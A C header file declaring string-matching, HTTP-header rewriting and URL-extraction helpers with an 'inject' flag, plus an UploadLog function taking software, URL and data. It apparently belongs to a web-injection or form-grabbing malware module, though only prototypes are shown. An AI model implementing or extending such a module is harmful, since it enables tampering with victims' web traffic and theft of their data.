#pragma once
#include "../Common.h"

#define MAX_REQUESTS 256

char *FindStrSandwich(char *buf, char *leftPart, char *rightPart);
DWORD WildCardStrCmp(char *str, char *str2, BOOL ignoreCase, BOOL checkEnd);
DWORD WildCardStrStr(char *str, char *subStr, char **start);
BOOL ReplaceHeader(char **headers, char *name, char *value);
BOOL ReplaceBeforeAfter(char **str2replace, char *strBeforeAfter, char *strReplaceBefore, char *strReplaceAfter);
inline char *GetPath(char *headers);
inline char *GetHost(char *headers);
char *GetUrlHeaders(char *headers, BOOL *inject);
char *GetUrlHostPath(char *host, char *path, BOOL *inject);
void  UploadLog(char *software, char *url, char *data, BOOL inject);